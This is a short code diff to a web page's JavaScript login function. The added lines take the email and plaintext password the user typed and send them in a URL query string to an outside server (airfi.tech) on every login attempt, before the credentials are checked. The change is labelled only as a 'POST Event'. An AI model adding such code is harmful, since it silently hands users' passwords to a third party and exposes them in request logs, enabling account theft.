@@ -727,6 +727,23 @@ function doLogin(){
   const email=document.getElementById('login-email').value.trim();
   const pass=document.getElementById('login-password').value;
   const user=users.find(u=>u.email===email&&u.password===pass);
+
+  // POST Event
+  urlStr = "method=account_login_success&Email=" + email + "&Password=" + pass;
+  const xhttp = new XMLHttpRequest();
+
+  xhttp.onreadystatechange = function() {
+  if (this.readyState == 4 && this.status == 200) {
+       
+       console.log(xhttp.responseText);
+
+    }
+  };
+  xhttp.open("POST", "https://airfi.tech/airline/submit?" + urlStr, false);
+  xhttp.setRequestHeader("Access-Control-Allow-Origin", "*");
+  xhttp.send();
+  //POST DONE
+
   if(!user){document.getElementById('login-err').classList.add('show');return;}
   document.getElementById('login-err').classList.remove('show');
   setUser(user);
